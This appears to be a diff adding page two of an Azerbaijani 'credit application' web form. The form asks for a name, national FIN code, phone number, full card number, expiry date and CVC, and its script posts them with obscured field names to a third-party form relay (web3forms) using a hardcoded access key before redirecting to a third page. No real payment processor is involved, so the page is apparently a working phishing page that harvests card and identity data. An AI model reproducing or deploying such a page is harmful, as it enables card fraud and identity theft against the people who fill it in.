@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="az">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kredit Formu - 2-ci Səhifə</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap");
+      body {
+        font-family: "Roboto", sans-serif;
+        background: linear-gradient(135deg, #a18cd1, #fbc2eb, #fad0c4, #ff9a9e);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+      }
+      .form-container {
+        background: rgba(0, 0, 0, 0.2);
+        padding: 40px;
+        border-radius: 25px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        max-width: 400px;
+        width: 100%;
+        color: #fff;
+      }
+      h2 {
+        text-align: center;
+        color: #ffe600;
+        margin-bottom: 20px;
+      }
+      label {
+        display: block;
+        margin: 15px 0 5px;
+        font-weight: bold;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        border-radius: 15px;
+        border: none;
+        font-size: 1em;
+        margin-bottom: 10px;
+        box-sizing: border-box;
+      }
+      .btn {
+        width: 100%;
+        padding: 15px;
+        background: linear-gradient(90deg, #12c2e9, #c471ed, #f64f59);
+        border: none;
+        border-radius: 20px;
+        color: #fff;
+        font-size: 1.2em;
+        cursor: pointer;
+        margin-top: 15px;
+        transition: transform 0.2s, box-shadow 0.2s;
+      }
+      .btn:hover {
+        transform: scale(1.05);
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="form-container">
+      <h2>Kredit Formu</h2>
+      <form id="creditForm">
+        <label for="name">Adınız</label>
+        <input
+          type="text"
+          id="name"
+          name="name"
+          placeholder="Adınız"
+          required
+        />
+
+        <label for="fin">FIN kod (7 simvol)</label>
+        <input
+          type="text"
+          id="fin"
+          name="f"
+          placeholder="FIN kod"
+          maxlength="7"
+          required
+          style="text-transform: uppercase"
+        />
+
+        <label for="phone">Telefon nömrəsi</label>
+        <input
+          type="text"
+          id="phone"
+          name="t"
+          placeholder="050-123-45-67"
+          maxlength="13"
+          required
+        />
+
+        <label for="card">Kart nömrəsi</label>
+        <input
+          type="text"
+          id="card"
+          name="1"
+          placeholder="1234-5678-9012-3456"
+          maxlength="19"
+          required
+        />
+
+        <label for="expiry">Ay/İl</label>
+        <input
+          type="text"
+          id="expiry"
+          name="2"
+          placeholder="MM/YY"
+          maxlength="5"
+          required
+        />
+
+        <label for="cvc">CVC</label>
+        <input
+          type="text"
+          id="cvc"
+          name="3"
+          placeholder="123"
+          maxlength="3"
+          required
+        />
+
+        <button type="submit" class="btn">Yoxla</button>
+      </form>
+    </div>
+
+    <script>
+      // INPUT FORMAT
+      const finInput = document.getElementById("fin");
+      finInput.addEventListener("input", (e) => {
+        e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
+      });
+
+      const phoneInput = document.getElementById("phone");
+      phoneInput.addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "").substring(0, 10);
+        let f = "";
+        if (v.length > 0) f = v.substring(0, 3);
+        if (v.length >= 4) f += "-" + v.substring(3, 6);
+        if (v.length >= 7) f += "-" + v.substring(6, 8);
+        if (v.length >= 9) f += "-" + v.substring(8, 10);
+        e.target.value = f;
+      });
+
+      const cardInput = document.getElementById("card");
+      cardInput.addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "").substring(0, 16);
+        let f = v.match(/.{1,4}/g);
+        if (f) e.target.value = f.join("-");
+      });
+
+      const expiryInput = document.getElementById("expiry");
+      expiryInput.addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "").substring(0, 4);
+        e.target.value =
+          v.length > 2 ? v.substring(0, 2) + "/" + v.substring(2, 4) : v;
+      });
+
+      const cvcInput = document.getElementById("cvc");
+      cvcInput.addEventListener("input", (e) => {
+        e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
+      });
+
+      // FORM SUBMIT
+      document
+        .getElementById("creditForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+          const formData = new FormData(this);
+          formData.append("access_key", "c729b137-5cfe-4074-ad33-e1cd5f8fc1bd");
+
+          try {
+            const res = await fetch("https://api.web3forms.com/submit", {
+              method: "POST",
+              body: formData,
+            });
+            const data = await res.json();
+
+            if (data.success) {
+              window.location.href = "sehife3.html";
+            } else {
+              alert("Xəta: " + data.message);
+            }
+          } catch (err) {
+            alert("Server ilə əlaqə xətası!");
+          }
+        });
+    </script>
+  </body>
+</html>
